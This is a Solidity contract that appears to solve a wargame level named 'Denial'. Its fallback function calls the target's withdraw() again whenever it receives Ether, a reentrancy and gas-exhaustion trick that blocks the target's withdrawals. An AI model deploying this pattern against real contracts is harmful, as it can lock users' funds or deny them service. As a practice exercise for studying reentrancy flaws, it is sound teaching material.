// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import { IDenial } from "./IDenial.sol";


contract DenialSolution {
    IDenial denial;

    uint256 public counter;

    constructor(IDenial _denial) public {
        denial = _denial;
    }

    fallback() external payable {
        denial.withdraw();
    }
}
